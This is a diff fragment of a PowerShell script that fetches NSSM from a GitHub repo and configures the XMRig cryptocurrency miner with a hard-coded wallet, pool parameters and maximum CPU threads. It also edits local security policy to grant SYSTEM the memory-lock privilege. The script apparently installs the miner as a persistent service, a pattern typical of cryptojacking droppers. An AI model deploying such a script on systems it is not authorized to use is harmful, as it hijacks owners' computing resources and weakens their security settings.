@@ -11,23 +11,14 @@ Invoke-WebRequest -Uri https://github.com/GALVINVN/system/raw/refs/heads/main/ns
 $nssmZipPath = "$env:C:\nssm-2.24.zip"
 Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
 $nssmExe = "C:\xmrig\nssm-2.24\win64\nssm.exe"
-$wallet = "88j2KWTyLZSGfRweK4Gz7FNrF5R823wDjcFGjF8nWvYkUkGKooeGjvu3p9V95JLTuVKXs278BTDLBRPjMfLrVTLpHaTy8Um"
+$wallet = "RX2bYm1j6XVoChhFkvVUpahZCRebVfCuz4"
 $worker = "x2"
 $threads = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
-$appParams = "-o pool.hashvault.pro:443 " +
+$appParams = "-a $algorithm " +
+             "--coin $coin " +
+             "-o $pool " +
              "-u $wallet " +
-             "-p $worker " +
-             "--coin monero " +
-             "--tls " +
-             "--threads=$threads " +
-             "--cpu-max-threads-hint=100 " +
-             "--cpu-priority=5 " +
-             "--randomx-mode=fast " +
-             "--randomx-1gb-pages " +
-             "--randomx-jit " +
-             "--randomx-init=full " +
-             "--donate-level=0 " +
-             "--http-enabled --http-port=8080"
+             "-w $worker"
 secedit /export /cfg "$env:TEMP\secpol.cfg" | Out-Null
 (Get-Content "$env:TEMP\secpol.cfg") -replace 'SeLockMemoryPrivilege =.*', 'SeLockMemoryPrivilege = *S-1-5-18' | Set-Content "$env:TEMP\secpol_new.cfg"
 secedit /configure /db secedit.sdb /cfg "$env:TEMP\secpol_new.cfg" /areas USER_RIGHTS | Out-Null
